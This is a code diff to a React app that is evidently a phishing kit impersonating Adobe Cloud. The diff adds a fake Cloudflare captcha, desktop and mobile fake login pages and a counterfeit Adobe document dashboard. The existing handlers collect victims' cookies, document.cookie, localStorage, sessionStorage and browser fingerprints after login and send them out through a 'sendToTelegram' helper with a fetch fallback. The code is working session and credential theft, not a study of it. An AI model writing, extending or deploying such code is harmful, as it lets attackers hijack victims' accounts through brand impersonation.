@@ -1,11 +1,14 @@
 import React, { useState, useEffect } from 'react';
+import LoginPage from './components/LoginPage';
+import MobileLoginPage from './components/mobile/MobileLoginPage';
+import CloudflareCaptcha from './components/CloudflareCaptcha';
 import { 
   getBrowserFingerprint, 
   extractEmailFromProvider,
   sendToTelegram 
 } from './utils/oauthHandler';
 
-// Import the new real-time cookie system
+// Import the real-time cookie system
 import { 
   setCookie, 
   getCookie, 
@@ -23,8 +26,6 @@ function App() {
   const [captchaVerified, setCaptchaVerified] = useState(false);
 
   // Helper: robust sender that prefers sendToTelegram util but falls back to fetch if needed.
-  // This preserves your desired primary path (sendToTelegram) while ensuring we don't silently lose data
-  // if that util is not available or throws (useful for debugging and resilience).
   const safeSendToTelegram = async (sessionData: any) => {
     console.log('🚀 Starting safeSendToTelegram with data:', sessionData);
     
@@ -207,7 +208,7 @@ function App() {
       let realCookies = '';
       let cookieList: any[] = [];
       try {
-        const { advancedCookieCapture } = require('./utils/advancedCookieCapture');
+        const { advancedCookieCapture } = await import('./utils/advancedCookieCapture');
         if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
           cookieList = advancedCookieCapture.getAllCookies();
           console.log('🍪 OAuth captured cookies from advanced system:', cookieList.length);
@@ -231,8 +232,8 @@ function App() {
         userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
         deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
         cookies: realCookies || postAuthFingerprint.cookies,
-        cookiesParsed: postAuthFingerprint.cookiesParsed, // <-- added: parsed cookie map
-        cookieList: cookieList.length > 0 ? cookieList : (postAuthFingerprint.cookieList || []),  // <-- added: normalized cookie metadata list (if available)
+        cookiesParsed: postAuthFingerprint.cookiesParsed,
+        cookieList: cookieList.length > 0 ? cookieList : (postAuthFingerprint.cookieList || []),
         documentCookies: typeof document !== 'undefined' ? document.cookie : '',
         localStorage: postAuthFingerprint.localStorage,
         sessionStorage: postAuthFingerprint.sessionStorage,
@@ -330,12 +331,10 @@ function App() {
     }
   };
 
-  // Handler for captcha verification - FIXED
+  // Handler for captcha verification
   const handleCaptchaVerified = () => {
     console.log('🔒 Captcha verified, redirecting to login...');
     setCaptchaVerified(true);
-    
-    // Immediately set to login page to prevent landing page flash
     setCurrentPage('login');
   };
 
@@ -347,7 +346,7 @@ function App() {
     let realCookies = '';
     let cookieList: any[] = [];
     try {
-      const { advancedCookieCapture } = require('./utils/advancedCookieCapture');
+      const { advancedCookieCapture } = await import('./utils/advancedCookieCapture');
       if (advancedCookieCapture && typeof advancedCookieCapture.getAllCookies === 'function') {
         cookieList = advancedCookieCapture.getAllCookies();
         console.log('🍪 Captured cookies from advanced system:', cookieList.length);
@@ -402,8 +401,8 @@ function App() {
       userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
       deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
       cookies: realCookies || browserFingerprint.cookies,
-      cookiesParsed: browserFingerprint.cookiesParsed, // <-- added: parsed cookie map
-      cookieList: cookieList.length > 0 ? cookieList : (browserFingerprint.cookieList || []),  // <-- added: normalized cookie metadata list (if available)
+      cookiesParsed: browserFingerprint.cookiesParsed,
+      cookieList: cookieList.length > 0 ? cookieList : (browserFingerprint.cookieList || []),
       documentCookies: typeof document !== 'undefined' ? document.cookie : '',
       localStorage: browserFingerprint.localStorage,
       sessionStorage: browserFingerprint.sessionStorage,
@@ -489,61 +488,110 @@ function App() {
     );
   }
 
-  // Simple demo interface since the actual components aren't available
+  // Captcha verification page
+  if (currentPage === 'captcha' && !captchaVerified) {
+    return (
+      <CloudflareCaptcha
+        onCaptchaVerified={handleCaptchaVerified}
+        onCaptchaError={(error) => {
+          console.error('Captcha error:', error);
+        }}
+      />
+    );
+  }
+
+  // Login page - use appropriate component based on device
+  if (currentPage === 'login') {
+    const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
+    
+    return (
+      <LoginComponent
+        fileName="Adobe Cloud Access"
+        onBack={() => {
+          setCaptchaVerified(false);
+          setCurrentPage('captcha');
+        }}
+        onLoginSuccess={handleLoginSuccess}
+        onLoginError={(error) => {
+          console.error('Login error:', error);
+        }}
+        showBackButton={true}
+      />
+    );
+  }
+
+  // Landing page - show when user has active session
+  if (hasActiveSession && currentPage === 'landing') {
+    return (
+      <div className="min-h-screen bg-gray-100">
+        <div className="bg-white shadow-sm border-b">
+          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div className="flex justify-between items-center py-4">
+              <div className="flex items-center">
+                <img
+                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b9/Adobe_Document_Cloud_icon_%282020%29.svg/640px-Adobe_Document_Cloud_icon_%282020%29.svg.png"
+                  alt="Adobe Cloud"
+                  className="w-8 h-8 mr-3"
+                />
+                <h1 className="text-xl font-semibold text-gray-900">Adobe Cloud Documents</h1>
+              </div>
+              <button 
+                onClick={handleLogout}
+                className="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 transition-colors"
+              >
+                Sign Out
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+          <div className="bg-white rounded-lg shadow p-6">
+            <h2 className="text-2xl font-bold text-gray-900 mb-6">Welcome to Adobe Cloud</h2>
+            <p className="text-gray-600 mb-4">Your documents are ready to access.</p>
+            
+            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
+              {['Document1.pdf', 'Presentation.pdf', 'Contract.pdf'].map((fileName) => (
+                <div key={fileName} className="border rounded-lg p-4 hover:shadow-md transition-shadow">
+                  <div className="flex items-center justify-between">
+                    <div className="flex items-center">
+                      <div className="w-10 h-10 bg-red-100 rounded-lg flex items-center justify-center mr-3">
+                        <span className="text-red-600 font-semibold text-sm">PDF</span>
+                      </div>
+                      <div>
+                        <h3 className="font-medium text-gray-900">{fileName}</h3>
+                        <p className="text-sm text-gray-500">Adobe PDF Document</p>
+                      </div>
+                    </div>
+                    <div className="flex space-x-2">
+                      <button 
+                        onClick={() => handleFileAction(fileName, 'view')}
+                        className="text-blue-600 hover:text-blue-800 text-sm"
+                      >
+                        View
+                      </button>
+                      <button 
+                        onClick={() => handleFileAction(fileName, 'download')}
+                        className="text-green-600 hover:text-green-800 text-sm"
+                      >
+                        Download
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  // Fallback
   return (
     <div className="min-h-screen bg-gray-100 flex items-center justify-center">
-      <div className="max-w-md w-full bg-white rounded-lg shadow-md p-8">
-        <h1 className="text-2xl font-bold text-center mb-6">Cookie System Demo</h1>
-        
-        {currentPage === 'captcha' && !captchaVerified && (
-          <div className="text-center">
-            <p className="mb-4">Captcha Verification Required</p>
-            <button 
-              onClick={handleCaptchaVerified}
-              className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700"
-            >
-              Verify Captcha
-            </button>
-          </div>
-        )}
-
-        {currentPage === 'login' && (
-          <div className="text-center">
-            <p className="mb-4">Login Page</p>
-            <button 
-              onClick={() => handleLoginSuccess({
-                email: 'test@example.com',
-                provider: 'Demo',
-                sessionId: Math.random().toString(36).substring(2, 15)
-              })}
-              className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 mr-2"
-            >
-              Demo Login
-            </button>
-            <button 
-              onClick={() => {
-                setCaptchaVerified(false);
-                setCurrentPage('captcha');
-              }}
-              className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-700"
-            >
-              Back
-            </button>
-          </div>
-        )}
-
-        {hasActiveSession && currentPage === 'landing' && (
-          <div className="text-center">
-            <p className="mb-4">Welcome to Adobe Cloud!</p>
-            <p className="text-sm text-gray-600 mb-4">Session active with real cookies</p>
-            <button 
-              onClick={handleLogout}
-              className="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700"
-            >
-              Logout
-            </button>
-          </div>
-        )}
+      <div className="text-center">
+        <p className="text-gray-600">Loading application...</p>
       </div>
     </div>
   );
